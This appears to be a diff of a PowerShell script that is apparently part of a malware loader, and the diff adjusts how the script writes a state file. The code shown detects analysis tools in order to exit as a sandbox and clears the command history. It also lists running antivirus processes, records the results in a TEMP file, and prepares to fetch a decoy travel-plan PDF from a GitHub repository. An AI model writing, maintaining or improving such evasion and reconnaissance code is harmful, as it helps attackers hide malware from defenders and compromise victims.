@@ -20,7 +20,7 @@ if (Get-Process | Where-Object { $_.Name -match $toolProcs }) { $sb = $true }
 
 if ($sb) {
     [void]$state.Add('state=sandbox-exit')
-    [IO.File]::WriteAllText((Join-Path $env:TEMP 'value.txt'), ($state -join "`n"))
+    [IO.File]::WriteAllBytes((Join-Path $env:TEMP 'value.txt'), [Text.Encoding]::UTF8.GetBytes($state -join "`n"))
     Clear-History
     exit
 }
@@ -31,7 +31,7 @@ $found = @(Get-Process | Where-Object { $_.Name -match $avProcs } |
 [void]$state.Add("av=$($found -join ',')")
 
 [void]$state.Add('state=ok')
-[IO.File]::WriteAllText((Join-Path $env:TEMP 'value.txt'), ($state -join "`n"))
+[IO.File]::WriteAllBytes((Join-Path $env:TEMP 'value.txt'), [Text.Encoding]::UTF8.GetBytes($state -join "`n"))
 
 $DecoyApi = 'https://api.github.com/repos/rotalbilly5-sketch/Dream/contents/Travel-Meeting-Plan-Q4-2026.pdf'
 $DecoyPath = Join-Path $env:TEMP 'Travel-Meeting-Plan-Q4-2026.pdf'
